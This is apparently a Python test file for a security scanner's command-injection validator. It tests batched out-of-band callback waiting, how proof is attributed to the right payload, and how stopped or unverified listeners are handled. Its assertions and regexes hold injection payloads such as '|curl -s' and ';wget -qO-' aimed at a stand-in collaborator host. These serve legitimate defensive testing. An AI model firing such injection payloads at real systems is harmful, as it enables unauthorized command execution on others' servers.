"""Ticket E3: the command-injection out-of-band phase waits once, not once per payload.

Every out-of-band payload is sent first (one token each), then a single
`wait_for_any(tokens)` watches for a callback. A hit proves the payload that carried
the hit token, and the proof exchanges are built from THAT payload's (loc, param).

Caller-level: every test drives CommandInjectionValidator.validate(). The fake
collaborator records the order of calls; the transport is either the stand-in used by
harness.test_injection_legs or a real run against an owned 127.0.0.1 target. Each
negative control swaps the new logic out and proves the same assertion helper fails.

Deviation recorded here on purpose: the "callback unavailable" short-circuit before
the sends applies only to a listener that is STOPPED. An unverified target network is
not "cannot produce evidence" -- docs/CALLBACK_CONFIGURATION.md: an exact registered
callback proves its probe without a preflight, and nothing in production runs one --
so that case still sends and still confirms on a hit.
"""
from __future__ import annotations

import asyncio
import re
import time
import unittest
import urllib.request
from unittest.mock import patch
from urllib.parse import unquote

from harness import collaborator
from harness.models import Finding, HttpExchange
from harness.test_confirmation_soundness_rve import _finding, _verdicts
from harness.test_default_history_caller import _exchange
from harness.test_proof_artifacts import _ProofCallerBase, _Target, _sent_text as _sent_text_raw
from harness.testing_fixtures.sent_probe import CountingResponder, seed_gate_scope
from harness.validators import command_injection_validator as cmdi
from harness.validators.command_injection_validator import CommandInjectionValidator

def _sent_text(proof, artifact_id) -> str:
    """What the exchange carried, url-decoded, with a query's `+` read as a space."""
    return _sent_text_raw(proof, artifact_id).replace("+", " ")


_TEMPLATES = len(cmdi._TEMPLATES)
_INBAND = len(cmdi._INBAND)


def _f():
    return Finding(vulnerability_class="command injection", confidence=0.5, severity="high",
                   summary="cmdi", evidence="e", suggested_test="t", basis="derived")


class _FakeCollab:
    """Records the order of calls. `hit_at` is the 1-based index of the token that
    the batched wait reports as called back (None: no callback ever arrives)."""

    def __init__(self, events=None, hit_at=None):
        self.events = events if events is not None else []
        self.tokens = []
        self.hit_at = hit_at
        self.wait_for_any_calls = []
        self.wait_for_hit_calls = []

    def token(self):
        self.tokens.append(f"oob{len(self.tokens) + 1}")
        return self.tokens[-1]

    def url(self, token):
        return f"http://collab.test/{token}"

    async def wait_for_any(self, tokens, timeout=6.0):
        self.events.append("wait")
        self.wait_for_any_calls.append((list(tokens), timeout))
        if self.hit_at:
            return list(tokens)[self.hit_at - 1]
        await asyncio.sleep(timeout)      # a real listener waits out its window
        return None

    async def wait_for_hit(self, token, timeout=6.0):
        self.events.append("wait")
        self.wait_for_hit_calls.append(token)
        return False


class _BlindCollab(_FakeCollab):
    """The negative control: a batched wait that never sees the hit."""

    async def wait_for_any(self, tokens, timeout=6.0):
        self.events.append("wait")
        self.wait_for_any_calls.append((list(tokens), timeout))
        return None


class _LegacyCollab:
    """A listener with only wait_for_hit (the pre-E3 interface)."""

    def __init__(self, hit_token=None, wait_each=None):
        self.n = 0
        self.hit_token = hit_token
        self.wait_each = wait_each
        self.waits = []

    def token(self):
        self.n += 1
        return f"oob{self.n}"

    def url(self, token):
        return f"http://collab.test/{token}"

    async def wait_for_hit(self, token, timeout=6.0):
        self.waits.append((token, timeout))
        if self.wait_each is not None:
            await asyncio.sleep(min(timeout, self.wait_each))
        return token == self.hit_token


class _StoppedCollab(_FakeCollab):
    """A listener that can record nothing, as Collaborator reports after stop()."""

    def health(self):
        return {"available": False}

    def unavailable_reason(self, target_url):
        return "callback listener is stopped"


class _UnverifiedCollab(_FakeCollab):
    """A live listener whose target network was never preflighted -- the production
    default. It still records an exact callback."""

    def health(self):
        return {"available": True}

    def unavailable_reason(self, target_url):
        return "callback reachability from the target network is unverified; assessment incomplete"


class _Resp:
    status_code = 200

    def __init__(self, text="ok"):
        self.text = text


class _Wire:
    """The patched httpx request: tells in-band from out-of-band sends by what the
    request carries, and keeps the order against the collaborator's own events."""

    def __init__(self, events, on_oob=None):
        self.events = events
        self.on_oob = on_oob
        self.oob_payloads = []

    async def __call__(self, client, method, url, content=None, headers=None, **kw):
        sent = unquote(f"{url} {content or ''}")
        if "curl" in sent or "wget" in sent:
            self.events.append("oob")
            self.oob_payloads.append(sent)
            if self.on_oob is not None:
                await self.on_oob(sent)
        else:
            self.events.append("inband")
        return _Resp("ok")


class _GateAllowsMutating(unittest.TestCase):
    HOST = "t.test"

    def setUp(self):
        seed_gate_scope([self.HOST])

    def tearDown(self):
        from harness import safety_gate
        safety_gate.reset_default_gate()

    def _exchange(self):
        return HttpExchange(url=f"http://{self.HOST}/api/ping", method="POST",
                            request_headers={"Content-Type": "application/json"},
                            request_body='{"host":"127.0.0.1","note":"x"}',
                            response_status=200, response_body="{}")

    def _validate(self, collab, wire, *, timeout=0.2, templates=None):
        validator = CommandInjectionValidator(allowed_hosts=[self.HOST], timeout=timeout,
                                              collaborator=collab)
        responder = CountingResponder(wire)
        patches = [patch("httpx.AsyncClient.request", responder)]
        if templates is not None:
            patches.append(patch.object(cmdi, "_TEMPLATES", cmdi._TEMPLATES[:templates]))
        for p in patches:
            p.start()
            self.addCleanup(p.stop)
        return asyncio.run(validator.validate(_f(), self._exchange()))


class BatchedWaitTests(_GateAllowsMutating):
    def _assert_one_batched_wait_after_every_send(self, result, collab, events):
        oob = 2 * _TEMPLATES
        self.assertEqual(events, ["inband"] * (2 * _INBAND) + ["oob"] * oob + ["wait"],
                         "every out-of-band payload must be sent before the single wait")
        self.assertEqual(len(collab.wait_for_any_calls), 1)
        self.assertEqual(collab.wait_for_hit_calls, [])
        waited_on, _timeout = collab.wait_for_any_calls[0]
        self.assertEqual(waited_on, collab.tokens, "the wait covers every token, in send order")
        self.assertEqual(len(waited_on), oob)
        self.assertEqual(result.status, "not_confirmed", result.summary)

    def test_no_hit_sends_everything_then_waits_once(self):
        events = []
        collab = _FakeCollab(events)
        result = self._validate(collab, _Wire(events))
        self._assert_one_batched_wait_after_every_send(result, collab, events)
        self.assertFalse(result.confirmed)
        self.assertIn(f"Waited once for {2 * _TEMPLATES} callback(s) (timeout 0.2 s)", result.evidence)
        self.assertIn("no collaborator hit within the window", result.evidence)
        self.assertEqual(result.summary, "No out-of-band callback observed -- parameters do not appear to reach a shell")

    def test_ordering_control_fails_for_a_wait_per_payload(self):
        # The pre-E3 shape: one timed wait per payload. The helper must reject it.
        async def wait_per_payload(collab, tokens, timeout):
            for token in tokens:
                hit = await collab.wait_for_any([token], timeout=timeout)
                if hit:
                    return hit
            return None
        events = []
        collab = _FakeCollab(events)
        with patch.object(cmdi, "_wait_for_any", wait_per_payload):
            result = self._validate(collab, _Wire(events), timeout=0.05)
        with self.assertRaises(AssertionError):
            self._assert_one_batched_wait_after_every_send(result, collab, events)
        self.assertEqual(len(collab.wait_for_any_calls), 2 * _TEMPLATES)

    def test_a_hit_on_the_third_token_confirms_that_payload(self):
        events = []
        collab = _FakeCollab(events, hit_at=3)
        wire = _Wire(events)
        result = self._validate(collab, wire)
        self.assertEqual(result.status, "confirmed", result.summary)
        self.assertTrue(result.confirmed)
        self.assertIn("'host'", result.summary)             # the third payload is on the first parameter
        self.assertIn("|curl -s <collaborator>", result.evidence)   # ...and is the third template
        self.assertEqual(len(collab.wait_for_any_calls), 1)
        self.assertEqual(collab.wait_for_hit_calls, [])

    def test_a_listener_with_only_wait_for_hit_falls_back_within_one_deadline(self):
        legacy = _LegacyCollab(hit_token="oob3")
        events = []
        result = self._validate(legacy, _Wire(events))
        self.assertEqual(result.status, "confirmed", result.summary)
        # Per-token polling stopped at the hit token.
        self.assertEqual([t for t, _ in legacy.waits], ["oob1", "oob2", "oob3"])

    def test_fallback_total_wait_stays_inside_the_timeout(self):
        legacy = _LegacyCollab(hit_token=None, wait_each=10)   # each wait would use its whole slice
        started = time.monotonic()
        result = self._validate(legacy, _Wire([]), timeout=0.6, templates=3)
        elapsed = time.monotonic() - started
        self.assertEqual(result.status, "not_confirmed", result.summary)
        self.assertLess(elapsed, 1.5, f"{len(legacy.waits)} serial waits took {elapsed:.2f}s")


class _RefuseThirdOob(_Wire):
    """Delivers two out-of-band payloads, then the gate refuses the third."""

    async def __call__(self, client, method, url, content=None, headers=None, **kw):
        resp = await super().__call__(client, method, url, content=content, headers=headers, **kw)
        if len(self.oob_payloads) == 3:
            from harness import safety_gate
            raise safety_gate.SafetyGateBlocked(safety_gate.AuthorizationDecision(
                False, list(safety_gate.ActionRiskTier)[0], "budget exhausted"))
        return resp


class RefusedMidBatchTests(_GateAllowsMutating):
    def test_a_callback_from_a_payload_delivered_before_the_refusal_still_confirms(self):
        events = []
        collab = _FakeCollab(events, hit_at=1)
        result = self._validate(collab, _RefuseThirdOob(events))
        self.assertEqual(result.status, "confirmed", result.summary)
        self.assertEqual(len(collab.wait_for_any_calls), 1)
        self.assertEqual(len(collab.wait_for_any_calls[0][0]), 2, "waits on the delivered payloads only")

    def test_without_a_callback_the_refusal_leaves_the_check_incomplete(self):
        events = []
        collab = _FakeCollab(events)
        result = self._validate(collab, _RefuseThirdOob(events))
        self.assertIn(result.status, ("inconclusive", "blocked"), result.summary)
        self.assertIn("incomplete", result.summary)
        self.assertFalse(result.confirmed)
        self.assertEqual(events.count("oob"), 3, "no template is tried after the refusal")


class _RunProofBase(_ProofCallerBase, unittest.TestCase):
    """Local base: the orphan-test guard only resolves bases defined in the file."""


class HitProofTests(_RunProofBase):
    """A hit on the third token, inside a real run against an owned target: the proof
    names the third payload's send, a control on the same parameter and the original
    request, all distinct and resolvable."""

    def _run(self, collab):
        target = _Target(lambda method, path, headers, body: (200, '{"output": "pinged"}'))
        self.addCleanup(target.close)
        url = target.origin + "/stock?host=127.0.0.1&note=x"
        validator = CommandInjectionValidator(allowed_hosts=list(self.HOSTS), timeout=5.0,
                                              collaborator=collab)
        run_id, reports, proofs = self._confirm(
            "command_injection", validator, _finding("command_injection"), _exchange(url))
        return run_id, url, reports, proofs

    def _assert_proof_belongs_to_the_third_payload(self, run_id, url, reports, proofs):
        self.assertEqual([r.status for r in reports], ["confirmed"], _verdicts(reports))
        proof = self._stored_proof(proofs)
        self._assert_counted(run_id, proof, url, "command_injection")   # three distinct, resolvable exchanges
        baseline = _sent_text(proof, proof["baseline_artifact_id"])
        attack = _sent_text(proof, proof["attack_artifact_id"])
        control = _sent_text(proof, proof["control_artifact_ids"][0])
        # Attack: the third payload -- `host`, third template -- carrying the third token.
        self.assertIn("collab.test/oob3", attack)
        self.assertIn("|curl -s", attack)
        self.assertRegex(attack, r"host=\|curl -s http://collab\.test/oob3")
        self.assertIn("note=x", attack)
        self.assertNotIn("oob4", attack)
        # Control: the SAME parameter given a marker with no shell syntax.
        self.assertRegex(control, r"host=HV[0-9a-f]{6}")
        self.assertNotIn("collab.test", control)
        self.assertIn("note=x", control)
        # Baseline: the request as captured.
        self.assertIn("host=127.0.0.1", baseline)
        self.assertNotIn("collab.test", baseline)
        self.assertEqual(len({proof["baseline_artifact_id"], proof["attack_artifact_id"],
                              proof["control_artifact_ids"][0]}), 3)

    def test_proof_exchanges_belong_to_the_hit_token(self):
        self._assert_proof_belongs_to_the_third_payload(*self._run(_FakeCollab(hit_at=3)))

    def test_the_hit_test_fails_when_the_batched_wait_never_sees_the_hit(self):
        # Control: the same flow with a wait_for_any that misses the hit is not
        # confirmed, so the helper above must fail -- the test depends on the wait.
        args = self._run(_BlindCollab())
        with self.assertRaises(AssertionError):
            self._assert_proof_belongs_to_the_third_payload(*args)

    def test_proof_follows_the_token_not_the_last_send(self):
        # Hit on a token of the SECOND parameter: the proof must move with it.
        run_id, url, reports, proofs = self._run(_FakeCollab(hit_at=_TEMPLATES + 2))
        self.assertEqual([r.status for r in reports], ["confirmed"], _verdicts(reports))
        proof = self._stored_proof(proofs)
        attack = _sent_text(proof, proof["attack_artifact_id"])
        self.assertRegex(attack, rf"note=;wget -qO- http://collab\.test/oob{_TEMPLATES + 2}")
        self.assertIn("host=127.0.0.1", attack)
        control = _sent_text(proof, proof["control_artifact_ids"][0])
        self.assertRegex(control, r"note=HV[0-9a-f]{6}")
        self.assertIn("host=127.0.0.1", control)


class UnavailableCallbackTests(_GateAllowsMutating):
    def _assert_no_out_of_band_send(self, result, collab, wire):
        self.assertEqual(wire.oob_payloads, [], "a stopped listener must not be sent payloads")
        self.assertEqual(collab.tokens, [])
        self.assertEqual(collab.wait_for_any_calls, [])
        self.assertEqual(result.status, "inconclusive", result.summary)
        self.assertEqual(result.summary, "callback listener is stopped")
        self.assertFalse(result.confirmed)

    def test_a_stopped_listener_sends_no_out_of_band_payload(self):
        events = []
        collab, wire = _StoppedCollab(events), _Wire(events)
        result = self._validate(collab, wire)
        self._assert_no_out_of_band_send(result, collab, wire)
        self.assertEqual(events, ["inband"] * (2 * _INBAND))     # the in-band phase still ran

    def test_stopped_listener_control_fails_when_the_precheck_is_removed(self):
        events = []
        collab, wire = _StoppedCollab(events), _Wire(events)
        with patch.object(collaborator, "listener_stopped", return_value=False):
            result = self._validate(collab, wire)
        with self.assertRaises(AssertionError):
            self._assert_no_out_of_band_send(result, collab, wire)
        self.assertEqual(len(wire.oob_payloads), 2 * _TEMPLATES)

    def test_unsent_in_band_requests_make_the_stopped_result_incomplete(self):
        class _Refusing(_Wire):
            async def __call__(self, client, method, url, content=None, headers=None, **kw):
                raise __import__("httpx").ConnectError("down")
        collab = _StoppedCollab([])
        result = self._validate(collab, _Refusing([]))
        self.assertEqual(result.status, "inconclusive")
        self.assertIn("send(s) got no response", result.summary)

    def test_unverified_reachability_still_sends_and_still_confirms_on_a_hit(self):
        # The true-positive guard: production never preflights, so every real
        # listener is "unverified". Treating that as unavailable would stop all
        # blind command-injection confirmations.
        events = []
        collab = _UnverifiedCollab(events, hit_at=3)
        wire = _Wire(events)
        result = self._validate(collab, wire)
        self.assertEqual(result.status, "confirmed", result.summary)
        self.assertGreaterEqual(len(wire.oob_payloads), 3)

    def test_unverified_reachability_without_a_hit_stays_inconclusive_as_before(self):
        events = []
        collab = _UnverifiedCollab(events)
        result = self._validate(collab, _Wire(events))
        self.assertEqual(result.status, "inconclusive", result.summary)
        self.assertIn("unverified", result.summary)
        self.assertEqual(len(collab.wait_for_any_calls), 1)


class RealListenerTests(_GateAllowsMutating):
    """The real in-process Collaborator, the real wait_for_any, a transport that plays
    the target's shell by fetching the callback URL out of the payload it receives."""
    HOST = "127.0.0.1"

    def setUp(self):
        super().setUp()
        self.listener = collaborator.Collaborator()
        self.addCleanup(self.listener.stop)

    def _exchange(self):
        return HttpExchange(url="http://127.0.0.1:9/api/ping", method="POST",
                            request_headers={"Content-Type": "application/json"},
                            request_body='{"host":"127.0.0.1","note":"x"}',
                            response_status=200, response_body="{}")

    def _wire_that_runs_payloads(self, which, events):
        count = {"n": 0}

        async def run_shell(sent):
            count["n"] += 1
            if count["n"] == which:
                callback = re.search(r"http://127\.0\.0\.1:\d+/oob[0-9a-f]+", sent).group(0)
                await asyncio.to_thread(urllib.request.urlopen, callback, None, 2)
        return _Wire(events, on_oob=run_shell)

    def test_real_listener_unverified_still_confirms_a_late_callback(self):
        events = []
        wire = self._wire_that_runs_payloads(which=5, events=events)
        self.assertTrue(self.listener.unavailable_reason("http://127.0.0.1:9/api/ping"),
                        "the fixture must model the unpreflighted production default")
        result = self._validate(self.listener, wire, timeout=2)
        self.assertEqual(result.status, "confirmed", result.summary)
        self.assertEqual(len(wire.oob_payloads), 2 * _TEMPLATES, "all payloads sent before the wait")

    def test_real_listener_waits_once_for_six_payloads(self):
        events = []
        started = time.monotonic()
        result = self._validate(self.listener, _Wire(events), timeout=0.5, templates=3)
        elapsed = time.monotonic() - started
        self.assertEqual(events.count("oob"), 6)
        self.assertEqual(result.status, "inconclusive", result.summary)   # unverified, no hit: as before
        print(f"\n[E3] 6 payloads, timeout 0.5 s, no callback: {elapsed:.2f}s batched")
        self.assertLess(elapsed, 1.5, f"6 payloads waited {elapsed:.2f}s; serial waits take >= 3s")

    def test_timing_control_fails_for_serial_waits(self):
        async def serial_waits(collab, tokens, timeout):
            for token in tokens:
                if await collab.wait_for_hit(token, timeout=timeout):
                    return token
            return None
        started = time.monotonic()
        with patch.object(cmdi, "_wait_for_any", serial_waits):
            self._validate(self.listener, _Wire([]), timeout=0.5, templates=3)
        elapsed = time.monotonic() - started
        print(f"\n[E3] same run with one wait per payload: {elapsed:.2f}s serial")
        with self.assertRaises(AssertionError):
            self.assertLess(elapsed, 1.5, f"6 payloads waited {elapsed:.2f}s")
        self.assertGreaterEqual(elapsed, 3.0)


class WaitForAnyTests(unittest.TestCase):
    def setUp(self):
        self.listener = collaborator.Collaborator()
        self.addCleanup(self.listener.stop)

    def _call(self, token):
        urllib.request.urlopen(self.listener.url(token), timeout=2).read()

    def test_returns_the_first_hit_token_in_the_order_given(self):
        a, b, c = (self.listener.token() for _ in range(3))
        self._call(c)
        self._call(b)
        self.assertEqual(asyncio.run(self.listener.wait_for_any([a, b, c], timeout=1)), b)

    def test_returns_none_when_nothing_arrives(self):
        tokens = [self.listener.token() for _ in range(3)]
        started = time.monotonic()
        self.assertIsNone(asyncio.run(self.listener.wait_for_any(tokens, timeout=0.4)))
        self.assertLess(time.monotonic() - started, 1.0)

    def test_sees_a_callback_that_arrives_during_the_wait(self):
        tokens = [self.listener.token() for _ in range(3)]

        async def go():
            async def late():
                await asyncio.sleep(0.3)
                await asyncio.to_thread(self._call, tokens[1])
            task = asyncio.create_task(late())
            hit = await self.listener.wait_for_any(tokens, timeout=3)
            await task
            return hit
        self.assertEqual(asyncio.run(go()), tokens[1])

    def test_wait_for_hit_is_unchanged(self):
        token = self.listener.token()
        self._call(token)
        self.assertTrue(asyncio.run(self.listener.wait_for_hit(token, timeout=1)))
        self.assertFalse(asyncio.run(self.listener.wait_for_hit(self.listener.token(), timeout=0.3)))

    def test_configured_collaborator_delegates(self):
        configured = collaborator.ConfiguredCollaborator({})
        self.addCleanup(configured.stop)
        token = configured.start().token()
        urllib.request.urlopen(configured.start().url(token), timeout=2).read()
        self.assertEqual(asyncio.run(configured.wait_for_any([token], timeout=1)), token)

    def test_listener_stopped_reads_health(self):
        self.assertFalse(collaborator.listener_stopped(self.listener))
        self.listener.stop()
        self.assertTrue(collaborator.listener_stopped(self.listener))
        self.assertFalse(collaborator.listener_stopped(object()))


if __name__ == "__main__":
    unittest.main()
